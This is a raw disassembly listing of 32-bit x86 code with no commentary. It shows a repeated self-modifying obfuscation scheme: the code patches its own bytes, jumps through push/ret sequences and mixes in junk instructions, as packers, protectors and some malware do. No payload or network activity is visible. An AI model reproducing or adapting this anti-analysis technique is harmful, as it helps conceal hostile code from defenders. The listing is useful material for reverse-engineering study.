  409a52:	58                   	pop    %eax
  409a53:	f3 90                	pause
  409a55:	1f                   	pop    %ds
  409a56:	8b bf a7 40 00 50    	mov    0x500040a7(%edi),%edi
  409a5c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409a60:	66 87 05 55 9a 40 00 	xchg   %ax,0x409a55
  409a67:	b8 03 1a 1f 20       	mov    $0x201f1a03,%eax
  409a6c:	8d 40 01             	lea    0x1(%eax),%eax
  409a6f:	87 04 24             	xchg   %eax,(%esp)
  409a72:	c3                   	ret
  409a73:	8f 05 a1 9a 40 00    	pop    0x409aa1
  409a79:	50                   	push   %eax
  409a7a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409a80:	8d 80 d3 47 59 ff    	lea    -0xa6b82d(%eax),%eax
  409a86:	87 05 8f 9a 40 00    	xchg   %eax,0x409a8f
  409a8c:	58                   	pop    %eax
  409a8d:	f3 90                	pause
  409a8f:	ac                   	lods   %ds:(%esi),%al
  409a90:	b1 52                	mov    $0x52,%cl
  409a92:	94                   	xchg   %eax,%esp
  409a93:	ff 50 66             	call   *0x66(%eax)
  409a96:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409a9b:	05 8f 9a 40 00       	add    $0x409a8f,%eax
  409aa0:	b8 42 83 e3 8a       	mov    $0x8ae38342,%eax
  409aa5:	87 04 24             	xchg   %eax,(%esp)
  409aa8:	c3                   	ret
  409aa9:	8f 05 d8 9a 40 00    	pop    0x409ad8
  409aaf:	50                   	push   %eax
  409ab0:	90                   	nop
  409ab1:	b8 15 20 40 00       	mov    $0x402015,%eax
  409ab6:	8d 80 ea f5 1f 52    	lea    0x521ff5ea(%eax),%eax
  409abc:	87 05 c5 9a 40 00    	xchg   %eax,0x409ac5
  409ac2:	58                   	pop    %eax
  409ac3:	f3 90                	pause
  409ac5:	0b 69 3f             	or     0x3f(%ecx),%ebp
  409ac8:	df 40 00             	filds  0x0(%eax)
  409acb:	50                   	push   %eax
  409acc:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409ad0:	66 87 05 c5 9a 40 00 	xchg   %ax,0x409ac5
  409ad7:	b8 81 28 62 15       	mov    $0x15622881,%eax
  409adc:	8d 40 01             	lea    0x1(%eax),%eax
  409adf:	87 04 24             	xchg   %eax,(%esp)
  409ae2:	c3                   	ret
  409ae3:	8f 05 11 9b 40 00    	pop    0x409b11
  409ae9:	50                   	push   %eax
  409aea:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409af0:	8d 80 d3 7c 47 ff    	lea    -0xb8832d(%eax),%eax
  409af6:	87 05 ff 9a 40 00    	xchg   %eax,0x409aff
  409afc:	58                   	pop    %eax
  409afd:	f3 90                	pause
  409aff:	ff 69 19             	ljmp   *0x19(%ecx)
  409b02:	6c                   	insb   (%dx),%es:(%edi)
  409b03:	ff 50 66             	call   *0x66(%eax)
  409b06:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409b0b:	05 ff 9a 40 00       	add    $0x409aff,%eax
  409b10:	b8 35 2d 58 cd       	mov    $0xcd582d35,%eax
  409b15:	87 04 24             	xchg   %eax,(%esp)
  409b18:	c3                   	ret
  409b19:	8f 05 49 9b 40 00    	pop    0x409b49
  409b1f:	50                   	push   %eax
  409b20:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409b26:	8d 80 b2 26 cc ff    	lea    -0x33d94e(%eax),%eax
  409b2c:	87 05 35 9b 40 00    	xchg   %eax,0x409b35
  409b32:	58                   	pop    %eax
  409b33:	f3 90                	pause
  409b35:	30 c3                	xor    %al,%bl
  409b37:	95                   	xchg   %eax,%ebp
  409b38:	70 00                	jo     0x409b3a
  409b3a:	00 00                	add    %al,(%eax)
  409b3c:	50                   	push   %eax
  409b3d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409b41:	66 87 05 35 9b 40 00 	xchg   %ax,0x409b35
  409b48:	b8 e2 9f ee 5d       	mov    $0x5dee9fe2,%eax
  409b4d:	8d 40 02             	lea    0x2(%eax),%eax
  409b50:	87 04 24             	xchg   %eax,(%esp)
  409b53:	c3                   	ret
  409b54:	8f 05 84 9b 40 00    	pop    0x409b84
  409b5a:	50                   	push   %eax
  409b5b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409b61:	8d 80 b2 26 d4 00    	lea    0xd426b2(%eax),%eax
  409b67:	87 05 70 9b 40 00    	xchg   %eax,0x409b70
  409b6d:	58                   	pop    %eax
  409b6e:	f3 90                	pause
  409b70:	9d                   	popf
  409b71:	ef                   	out    %eax,(%dx)
  409b72:	57                   	push   %edi
  409b73:	71 00                	jno    0x409b75
  409b75:	00 00                	add    %al,(%eax)
  409b77:	50                   	push   %eax
  409b78:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409b7c:	66 87 05 70 9b 40 00 	xchg   %ax,0x409b70
  409b83:	b8 f9 60 37 f7       	mov    $0xf73760f9,%eax
  409b88:	8d 40 02             	lea    0x2(%eax),%eax
  409b8b:	87 04 24             	xchg   %eax,(%esp)
  409b8e:	c3                   	ret
  409b8f:	8f 05 bd 9b 40 00    	pop    0x409bbd
  409b95:	50                   	push   %eax
  409b96:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409b9c:	8d 80 8c 54 17 40    	lea    0x4017548c(%eax),%eax
  409ba2:	87 05 ab 9b 40 00    	xchg   %eax,0x409bab
  409ba8:	58                   	pop    %eax
  409ba9:	f3 90                	pause
  409bab:	11 74 c8 48          	adc    %esi,0x48(%eax,%ecx,8)
  409baf:	00 50 66             	add    %dl,0x66(%eax)
  409bb2:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409bb7:	05 ab 9b 40 00       	add    $0x409bab,%eax
  409bbc:	b8 cf 1d e0 81       	mov    $0x81e01dcf,%eax
  409bc1:	87 04 24             	xchg   %eax,(%esp)
  409bc4:	c3                   	ret
  409bc5:	8f 05 f3 9b 40 00    	pop    0x409bf3
  409bcb:	50                   	push   %eax
  409bcc:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409bd2:	8d 80 53 e5 bf ff    	lea    -0x401aad(%eax),%eax
  409bd8:	87 05 e1 9b 40 00    	xchg   %eax,0x409be1
  409bde:	58                   	pop    %eax
  409bdf:	f3 90                	pause
  409be1:	82 b6 c7 7b 00 50 66 	xorb   $0x66,0x50007bc7(%esi)
  409be8:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409bed:	05 e1 9b 40 00       	add    $0x409be1,%eax
  409bf2:	b8 80 1d 2b 3d       	mov    $0x3d2b1d80,%eax
  409bf7:	87 04 24             	xchg   %eax,(%esp)
  409bfa:	c3                   	ret
  409bfb:	8f 05 29 9c 40 00    	pop    0x409c29
  409c01:	50                   	push   %eax
  409c02:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409c08:	8d 80 d3 14 44 ff    	lea    -0xbbeb2d(%eax),%eax
  409c0e:	87 05 17 9c 40 00    	xchg   %eax,0x409c17
  409c14:	58                   	pop    %eax
  409c15:	f3 90                	pause
  409c17:	28 3b                	sub    %bh,(%ebx)
  409c19:	4f                   	dec    %edi
  409c1a:	18 ff                	sbb    %bh,%bh
  409c1c:	50                   	push   %eax
  409c1d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409c21:	66 87 05 17 9c 40 00 	xchg   %ax,0x409c17
  409c28:	b8 d6 d0 71 ce       	mov    $0xce71d0d6,%eax
  409c2d:	87 04 24             	xchg   %eax,(%esp)
  409c30:	c3                   	ret
  409c31:	8f 05 5f 9c 40 00    	pop    0x409c5f
  409c37:	50                   	push   %eax
  409c38:	90                   	nop
  409c39:	b8 15 20 40 00       	mov    $0x402015,%eax
  409c3e:	8d 80 d3 fe 5b ff    	lea    -0xa4012d(%eax),%eax
  409c44:	87 05 4d 9c 40 00    	xchg   %eax,0x409c4d
  409c4a:	58                   	pop    %eax
  409c4b:	f3 90                	pause
  409c4d:	3c 1c                	cmp    $0x1c,%al
  409c4f:	25 bd ff 50 66       	and    $0x6650ffbd,%eax
  409c54:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409c59:	05 4d 9c 40 00       	add    $0x409c4d,%eax
  409c5e:	b8 1d 8d 57 54       	mov    $0x54578d1d,%eax
  409c63:	87 04 24             	xchg   %eax,(%esp)
  409c66:	c3                   	ret
  409c67:	8f 05 95 9c 40 00    	pop    0x409c95
  409c6d:	50                   	push   %eax
  409c6e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409c74:	8d 80 d3 68 43 ff    	lea    -0xbc972d(%eax),%eax
  409c7a:	87 05 83 9c 40 00    	xchg   %eax,0x409c83
  409c80:	58                   	pop    %eax
  409c81:	f3 90                	pause
  409c83:	77 bc                	ja     0x409c41
  409c85:	74 e2                	je     0x409c69
  409c87:	ff 50 66             	call   *0x66(%eax)
  409c8a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409c8f:	05 83 9c 40 00       	add    $0x409c83,%eax
  409c94:	b8 3d 6e 10 bb       	mov    $0xbb106e3d,%eax
  409c99:	87 04 24             	xchg   %eax,(%esp)
  409c9c:	c3                   	ret
  409c9d:	8f 05 cb 9c 40 00    	pop    0x409ccb
  409ca3:	50                   	push   %eax
  409ca4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409caa:	8d 80 d3 52 59 ff    	lea    -0xa6ad2d(%eax),%eax
  409cb0:	87 05 b9 9c 40 00    	xchg   %eax,0x409cb9
  409cb6:	58                   	pop    %eax
  409cb7:	f3 90                	pause
  409cb9:	7e 0f                	jle    0x409cca
  409cbb:	2c d5                	sub    $0xd5,%al
  409cbd:	ff 50 66             	call   *0x66(%eax)
  409cc0:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409cc5:	05 b9 9c 40 00       	add    $0x409cb9,%eax
  409cca:	b8 f0 e9 d6 f9       	mov    $0xf9d6e9f0,%eax
  409ccf:	87 04 24             	xchg   %eax,(%esp)
  409cd2:	c3                   	ret
  409cd3:	8f 05 01 9d 40 00    	pop    0x409d01
  409cd9:	50                   	push   %eax
  409cda:	90                   	nop
  409cdb:	b8 15 20 40 00       	mov    $0x402015,%eax
  409ce0:	8d 80 8c 54 17 40    	lea    0x4017548c(%eax),%eax
  409ce6:	87 05 ef 9c 40 00    	xchg   %eax,0x409cef
  409cec:	58                   	pop    %eax
  409ced:	f3 90                	pause
  409cef:	4c                   	dec    %esp
  409cf0:	8a a9 b5 00 50 66    	mov    0x665000b5(%ecx),%ch
  409cf6:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409cfb:	05 ef 9c 40 00       	add    $0x409cef,%eax
  409d00:	b8 14 30 7f 9e       	mov    $0x9e7f3014,%eax
  409d05:	87 04 24             	xchg   %eax,(%esp)
  409d08:	c3                   	ret
  409d09:	8f 05 38 9d 40 00    	pop    0x409d38
  409d0f:	50                   	push   %eax
  409d10:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409d16:	8d 80 76 f5 5f 57    	lea    0x575ff576(%eax),%eax
  409d1c:	87 05 25 9d 40 00    	xchg   %eax,0x409d25
  409d22:	58                   	pop    %eax
  409d23:	f3 90                	pause
  409d25:	15 5d ae 31 40       	adc    $0x4031ae5d,%eax
  409d2a:	00 50 66             	add    %dl,0x66(%eax)
  409d2d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409d32:	05 25 9d 40 00       	add    $0x409d25,%eax
  409d37:	b8 f0 0b ab e5       	mov    $0xe5ab0bf0,%eax
  409d3c:	8d 40 01             	lea    0x1(%eax),%eax
  409d3f:	87 04 24             	xchg   %eax,(%esp)
  409d42:	c3                   	ret
  409d43:	8f 05 72 9d 40 00    	pop    0x409d72
  409d49:	50                   	push   %eax
  409d4a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409d50:	8d 80 ea f5 6f 52    	lea    0x526ff5ea(%eax),%eax
  409d56:	87 05 5f 9d 40 00    	xchg   %eax,0x409d5f
  409d5c:	58                   	pop    %eax
  409d5d:	f3 90                	pause
  409d5f:	8e 1b                	mov    (%ebx),%ds
  409d61:	68 d7 40 00 50       	push   $0x500040d7
  409d66:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409d6a:	66 87 05 5f 9d 40 00 	xchg   %ax,0x409d5f
  409d71:	b8 bf 54 15 84       	mov    $0x841554bf,%eax
  409d76:	8d 40 01             	lea    0x1(%eax),%eax
  409d79:	87 04 24             	xchg   %eax,(%esp)
  409d7c:	c3                   	ret
  409d7d:	8f 05 ab 9d 40 00    	pop    0x409dab
  409d83:	50                   	push   %eax
  409d84:	90                   	nop
  409d85:	b8 15 20 40 00       	mov    $0x402015,%eax
  409d8a:	8d 80 8c 54 10 40    	lea    0x4010548c(%eax),%eax
  409d90:	87 05 99 9d 40 00    	xchg   %eax,0x409d99
  409d96:	58                   	pop    %eax
  409d97:	f3 90                	pause
  409d99:	91                   	xchg   %eax,%ecx
  409d9a:	07                   	pop    %es
  409d9b:	7a 12                	jp     0x409daf
  409d9d:	00 50 66             	add    %dl,0x66(%eax)
  409da0:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409da5:	05 99 9d 40 00       	add    $0x409d99,%eax
  409daa:	b8 12 4a 1b ae       	mov    $0xae1b4a12,%eax
  409daf:	87 04 24             	xchg   %eax,(%esp)
  409db2:	c3                   	ret
  409db3:	8f 05 e1 9d 40 00    	pop    0x409de1
  409db9:	50                   	push   %eax
  409dba:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409dc0:	8d 80 d3 1c 5b ff    	lea    -0xa4e32d(%eax),%eax
  409dc6:	87 05 cf 9d 40 00    	xchg   %eax,0x409dcf
  409dcc:	58                   	pop    %eax
  409dcd:	f3 90                	pause
  409dcf:	d4 42                	aam    $0x42
  409dd1:	3b f8                	cmp    %eax,%edi
  409dd3:	ff 50 66             	call   *0x66(%eax)
  409dd6:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409ddb:	05 cf 9d 40 00       	add    $0x409dcf,%eax
  409de0:	b8 27 3e 28 50       	mov    $0x50283e27,%eax
  409de5:	87 04 24             	xchg   %eax,(%esp)
  409de8:	c3                   	ret
  409de9:	8f 05 17 9e 40 00    	pop    0x409e17
  409def:	50                   	push   %eax
  409df0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409df6:	8d 80 8e 54 17 40    	lea    0x4017548e(%eax),%eax
  409dfc:	87 05 05 9e 40 00    	xchg   %eax,0x409e05
  409e02:	58                   	pop    %eax
  409e03:	f3 90                	pause
  409e05:	6a fe                	push   $0xfffffffe
  409e07:	49                   	dec    %ecx
  409e08:	be 00 50 66 b8       	mov    $0xb8665000,%esi
  409e0d:	eb e8                	jmp    0x409df7
  409e0f:	66 87 05 05 9e 40 00 	xchg   %ax,0x409e05
  409e16:	b8 f9 b3 c4 42       	mov    $0x42c4b3f9,%eax
  409e1b:	87 04 24             	xchg   %eax,(%esp)
  409e1e:	c3                   	ret
  409e1f:	8f 05 4d 9e 40 00    	pop    0x409e4d
  409e25:	50                   	push   %eax
  409e26:	90                   	nop
  409e27:	b8 15 20 40 00       	mov    $0x402015,%eax
  409e2c:	8d 80 8c 80 17 40    	lea    0x4017808c(%eax),%eax
  409e32:	87 05 3b 9e 40 00    	xchg   %eax,0x409e3b
  409e38:	58                   	pop    %eax
  409e39:	f3 90                	pause
  409e3b:	c1 78 e1 6a          	sarl   $0x6a,-0x1f(%eax)
  409e3f:	00 50 66             	add    %dl,0x66(%eax)
  409e42:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409e47:	05 3b 9e 40 00       	add    $0x409e3b,%eax
  409e4c:	b8 11 f7 d2 08       	mov    $0x8d2f711,%eax
  409e51:	87 04 24             	xchg   %eax,(%esp)
  409e54:	c3                   	ret
  409e55:	8f 05 84 9e 40 00    	pop    0x409e84
  409e5b:	50                   	push   %eax
  409e5c:	90                   	nop
  409e5d:	b8 15 20 40 00       	mov    $0x402015,%eax
  409e62:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  409e68:	87 05 71 9e 40 00    	xchg   %eax,0x409e71
  409e6e:	58                   	pop    %eax
  409e6f:	f3 90                	pause
  409e71:	f5                   	cmc
  409e72:	1d a9 69 40 00       	sbb    $0x4069a9,%eax
  409e77:	50                   	push   %eax
  409e78:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409e7c:	66 87 05 71 9e 40 00 	xchg   %ax,0x409e71
  409e83:	b8 31 a7 11 e1       	mov    $0xe111a731,%eax
  409e88:	8d 40 01             	lea    0x1(%eax),%eax
  409e8b:	87 04 24             	xchg   %eax,(%esp)
  409e8e:	c3                   	ret
  409e8f:	8f 05 bd 9e 40 00    	pop    0x409ebd
  409e95:	50                   	push   %eax
  409e96:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409e9c:	8d 80 53 e5 bf ff    	lea    -0x401aad(%eax),%eax
  409ea2:	87 05 ab 9e 40 00    	xchg   %eax,0x409eab
  409ea8:	58                   	pop    %eax
  409ea9:	f3 90                	pause
  409eab:	0d c5 d3 bd 00       	or     $0xbdd3c5,%eax
  409eb0:	50                   	push   %eax
  409eb1:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409eb5:	66 87 05 ab 9e 40 00 	xchg   %ax,0x409eab
  409ebc:	b8 48 71 7a 7d       	mov    $0x7d7a7148,%eax
  409ec1:	87 04 24             	xchg   %eax,(%esp)
  409ec4:	c3                   	ret
  409ec5:	8f 05 f3 9e 40 00    	pop    0x409ef3
  409ecb:	50                   	push   %eax
  409ecc:	90                   	nop
  409ecd:	b8 15 20 40 00       	mov    $0x402015,%eax
  409ed2:	8d 80 d3 2a 46 ff    	lea    -0xb9d52d(%eax),%eax
  409ed8:	87 05 e1 9e 40 00    	xchg   %eax,0x409ee1
  409ede:	58                   	pop    %eax
  409edf:	f3 90                	pause
  409ee1:	fc                   	cld
  409ee2:	9a f4 fb ff 50 66 b8 	lcall  $0xb866,$0x50fffbf4
  409ee9:	eb e8                	jmp    0x409ed3
  409eeb:	66 87 05 e1 9e 40 00 	xchg   %ax,0x409ee1
  409ef2:	b8 b2 e7 76 f1       	mov    $0xf176e7b2,%eax
  409ef7:	87 04 24             	xchg   %eax,(%esp)
  409efa:	c3                   	ret
  409efb:	8f 05 2a 9f 40 00    	pop    0x409f2a
  409f01:	50                   	push   %eax
  409f02:	90                   	nop
  409f03:	b8 15 20 40 00       	mov    $0x402015,%eax
  409f08:	8d 80 76 ed 3b 57    	lea    0x573bed76(%eax),%eax
  409f0e:	87 05 17 9f 40 00    	xchg   %eax,0x409f17
  409f14:	58                   	pop    %eax
  409f15:	f3 90                	pause
  409f17:	5c                   	pop    %esp
  409f18:	b1 57                	mov    $0x57,%cl
  409f1a:	e4 40                	in     $0x40,%al
  409f1c:	00 50 66             	add    %dl,0x66(%eax)
  409f1f:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409f24:	05 17 9f 40 00       	add    $0x409f17,%eax
  409f29:	b8 39 f6 b7 f7       	mov    $0xf7b7f639,%eax
  409f2e:	8d 40 01             	lea    0x1(%eax),%eax
  409f31:	87 04 24             	xchg   %eax,(%esp)
  409f34:	c3                   	ret
  409f35:	8f 05 66 9f 40 00    	pop    0x409f66
  409f3b:	50                   	push   %eax
  409f3c:	90                   	nop
  409f3d:	b8 15 20 40 00       	mov    $0x402015,%eax
  409f42:	8d 80 b2 24 e4 07    	lea    0x7e424b2(%eax),%eax
  409f48:	87 05 51 9f 40 00    	xchg   %eax,0x409f51
  409f4e:	58                   	pop    %eax
  409f4f:	f3 90                	pause
  409f51:	b9 69 ae 92 00       	mov    $0x92ae69,%ecx
  409f56:	00 00                	add    %al,(%eax)
  409f58:	00 50 66             	add    %dl,0x66(%eax)
  409f5b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409f60:	05 51 9f 40 00       	add    $0x409f51,%eax
  409f65:	b8 14 7c c7 0d       	mov    $0xdc77c14,%eax
  409f6a:	8d 40 03             	lea    0x3(%eax),%eax
  409f6d:	87 04 24             	xchg   %eax,(%esp)
  409f70:	c3                   	ret
  409f71:	8f 05 9f 9f 40 00    	pop    0x409f9f
  409f77:	50                   	push   %eax
  409f78:	90                   	nop
  409f79:	b8 15 20 40 00       	mov    $0x402015,%eax
  409f7e:	8d 80 d3 49 54 ff    	lea    -0xabb62d(%eax),%eax
  409f84:	87 05 8d 9f 40 00    	xchg   %eax,0x409f8d
  409f8a:	58                   	pop    %eax
  409f8b:	f3 90                	pause
  409f8d:	79 e0                	jns    0x409f6f
  409f8f:	76 c4                	jbe    0x409f55
  409f91:	ff 50 66             	call   *0x66(%eax)
  409f94:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409f99:	05 8d 9f 40 00       	add    $0x409f8d,%eax
  409f9e:	b8 e9 c5 e3 e5       	mov    $0xe5e3c5e9,%eax
  409fa3:	87 04 24             	xchg   %eax,(%esp)
  409fa6:	c3                   	ret
  409fa7:	8f 05 d6 9f 40 00    	pop    0x409fd6
  409fad:	50                   	push   %eax
  409fae:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409fb4:	8d 80 ea f5 1b 52    	lea    0x521bf5ea(%eax),%eax
  409fba:	87 05 c3 9f 40 00    	xchg   %eax,0x409fc3
  409fc0:	58                   	pop    %eax
  409fc1:	f3 90                	pause
  409fc3:	e7 f8                	out    %eax,$0xf8
  409fc5:	f5                   	cmc
  409fc6:	20 40 00             	and    %al,0x0(%eax)
  409fc9:	50                   	push   %eax
  409fca:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409fce:	66 87 05 c3 9f 40 00 	xchg   %ax,0x409fc3
  409fd5:	b8 c7 92 42 ad       	mov    $0xad4292c7,%eax
  409fda:	8d 40 01             	lea    0x1(%eax),%eax
  409fdd:	87 04 24             	xchg   %eax,(%esp)
  409fe0:	c3                   	ret
  409fe1:	8f 05 0f a0 40 00    	pop    0x40a00f
  409fe7:	50                   	push   %eax
  409fe8:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409fee:	8d 80 d3 6e 47 ff    	lea    -0xb8912d(%eax),%eax
  409ff4:	87 05 fd 9f 40 00    	xchg   %eax,0x409ffd
  409ffa:	58                   	pop    %eax
  409ffb:	f3 90                	pause
  409ffd:	94                   	xchg   %eax,%esp
  409ffe:	aa                   	stos   %al,%es:(%edi)
  409fff:	ec                   	in     (%dx),%al
  40a000:	86 ff                	xchg   %bh,%bh
  40a002:	50                   	push   %eax
  40a003:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a007:	66 87 05 fd 9f 40 00 	xchg   %ax,0x409ffd
  40a00e:	b8 b4 a0 c3 96       	mov    $0x96c3a0b4,%eax
  40a013:	87 04 24             	xchg   %eax,(%esp)
  40a016:	c3                   	ret
  40a017:	8f 05 45 a0 40 00    	pop    0x40a045
  40a01d:	50                   	push   %eax
  40a01e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a024:	8d 80 d3 fe 58 ff    	lea    -0xa7012d(%eax),%eax
  40a02a:	87 05 33 a0 40 00    	xchg   %eax,0x40a033
  40a030:	58                   	pop    %eax
  40a031:	f3 90                	pause
  40a033:	8c 37                	mov    %?,(%edi)
  40a035:	a0 14 ff 50 66       	mov    0x6650ff14,%al
  40a03a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a03f:	05 33 a0 40 00       	add    $0x40a033,%eax
  40a044:	b8 99 54 3b 2f       	mov    $0x2f3b5499,%eax
  40a049:	87 04 24             	xchg   %eax,(%esp)
  40a04c:	c3                   	ret
  40a04d:	8f 05 7c a0 40 00    	pop    0x40a07c
  40a053:	50                   	push   %eax
  40a054:	90                   	nop
  40a055:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a05a:	8d 80 ea 05 c0 51    	lea    0x51c005ea(%eax),%eax
  40a060:	87 05 69 a0 40 00    	xchg   %eax,0x40a069
  40a066:	58                   	pop    %eax
  40a067:	f3 90                	pause
  40a069:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a06a:	1d ad 92 40 00       	sbb    $0x4092ad,%eax
  40a06f:	50                   	push   %eax
  40a070:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a074:	66 87 05 69 a0 40 00 	xchg   %ax,0x40a069
  40a07b:	b8 10 6c e6 39       	mov    $0x39e66c10,%eax
  40a080:	8d 40 01             	lea    0x1(%eax),%eax
  40a083:	87 04 24             	xchg   %eax,(%esp)
  40a086:	c3                   	ret
  40a087:	8f 05 b6 a0 40 00    	pop    0x40a0b6
  40a08d:	50                   	push   %eax
  40a08e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a094:	8d 80 ea f5 1b 52    	lea    0x521bf5ea(%eax),%eax
  40a09a:	87 05 a3 a0 40 00    	xchg   %eax,0x40a0a3
  40a0a0:	58                   	pop    %eax
  40a0a1:	f3 90                	pause
  40a0a3:	59                   	pop    %ecx
  40a0a4:	e3 d5                	jecxz  0x40a07b
  40a0a6:	7a 40                	jp     0x40a0e8
  40a0a8:	00 50 66             	add    %dl,0x66(%eax)
  40a0ab:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a0b0:	05 a3 a0 40 00       	add    $0x40a0a3,%eax
  40a0b5:	b8 0d cb d2 27       	mov    $0x27d2cb0d,%eax
  40a0ba:	8d 40 01             	lea    0x1(%eax),%eax
  40a0bd:	87 04 24             	xchg   %eax,(%esp)
  40a0c0:	c3                   	ret
  40a0c1:	8f 05 ef a0 40 00    	pop    0x40a0ef
  40a0c7:	50                   	push   %eax
  40a0c8:	90                   	nop
  40a0c9:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a0ce:	8d 80 d3 54 58 ff    	lea    -0xa7ab2d(%eax),%eax
  40a0d4:	87 05 dd a0 40 00    	xchg   %eax,0x40a0dd
  40a0da:	58                   	pop    %eax
  40a0db:	f3 90                	pause
  40a0dd:	08 ce                	or     %cl,%dh
  40a0df:	9a 4c ff 50 66 b8 eb 	lcall  $0xebb8,$0x6650ff4c
  40a0e6:	e8 66 87 05 dd       	call   0xdd462851
  40a0eb:	a0 40 00 b8 63       	mov    0x63b80040,%al
  40a0f0:	f8                   	clc
  40a0f1:	2c 2c                	sub    $0x2c,%al
  40a0f3:	87 04 24             	xchg   %eax,(%esp)
  40a0f6:	c3                   	ret
  40a0f7:	8f 05 26 a1 40 00    	pop    0x40a126
  40a0fd:	50                   	push   %eax
  40a0fe:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a104:	8d 80 ea f5 1b 52    	lea    0x521bf5ea(%eax),%eax
  40a10a:	87 05 13 a1 40 00    	xchg   %eax,0x40a113
  40a110:	58                   	pop    %eax
  40a111:	f3 90                	pause
  40a113:	ee                   	out    %al,(%dx)
  40a114:	19 98 4d 40 00 50    	sbb    %ebx,0x5000404d(%eax)
  40a11a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a11e:	66 87 05 13 a1 40 00 	xchg   %ax,0x40a113
  40a125:	b8 f0 b8 86 e1       	mov    $0xe186b8f0,%eax
  40a12a:	8d 40 01             	lea    0x1(%eax),%eax
  40a12d:	87 04 24             	xchg   %eax,(%esp)
  40a130:	c3                   	ret
  40a131:	8f 05 61 a1 40 00    	pop    0x40a161
  40a137:	50                   	push   %eax
  40a138:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a13e:	8d 80 b2 26 cc ff    	lea    -0x33d94e(%eax),%eax
  40a144:	87 05 4d a1 40 00    	xchg   %eax,0x40a14d
  40a14a:	58                   	pop    %eax
  40a14b:	f3 90                	pause
  40a14d:	11 ea                	adc    %ebp,%edx
  40a14f:	21 ac 00 00 00 50 66 	and    %ebp,0x66500000(%eax,%eax,1)
  40a156:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40a15b:	05 4d a1 40 00       	add    $0x40a14d,%eax
  40a160:	b8 fa a9 36 31       	mov    $0x3136a9fa,%eax
  40a165:	8d 40 02             	lea    0x2(%eax),%eax
  40a168:	87 04 24             	xchg   %eax,(%esp)
  40a16b:	c3                   	ret
  40a16c:	8f 05 9a a1 40 00    	pop    0x40a19a
  40a172:	50                   	push   %eax
  40a173:	90                   	nop
  40a174:	b8 15 20 40 00       	mov    $0x402015,%eax
  40a179:	8d 80 d3 a9 57 ff    	lea    -0xa8562d(%eax),%eax
  40a17f:	87 05 88 a1 40 00    	xchg   %eax,0x40a188
  40a185:	58                   	pop    %eax
  40a186:	f3 90                	pause
  40a188:	38 45 64             	cmp    %al,0x64(%ebp)
  40a18b:	a2 ff 50 66 b8       	mov    %al,0xb86650ff
  40a190:	eb e8                	jmp    0x40a17a
  40a192:	66 87 05 88 a1 40 00 	xchg   %ax,0x40a188
  40a199:	b8 4c c2 80 5b       	mov    $0x5b80c24c,%eax
  40a19e:	87 04 24             	xchg   %eax,(%esp)
  40a1a1:	c3                   	ret
  40a1a2:	8f 05 d0 a1 40 00    	pop    0x40a1d0
  40a1a8:	50                   	push   %eax
  40a1a9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40a1af:	8d 80 d3 bd 40 ff    	lea    -0xbf422d(%eax),%eax
  40a1b5:	87 05 be a1 40 00    	xchg   %eax,0x40a1be
  40a1bb:	58                   	pop    %eax
  40a1bc:	f3 90                	pause
  40a1be:	ad                   	lods   %ds:(%esi),%eax
  40a1bf:	35 33 aa ff 50       	xor    $0x50ffaa33,%eax
  40a1c4:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40a1c8:	66 87 05 be a1 40 00 	xchg   %ax,0x40a1be
  40a1cf:	b8 15 dd 5f 7b       	mov    $0x7b5fdd15,%eax
  40a1d4:	87 04 24             	xchg   %eax,(%esp)
  40a1d7:	c3                   	ret
  40a1d8:	8f 05 08 a2 40 00    	pop    0x40a208
  40a1de:	50                   	push   %eax
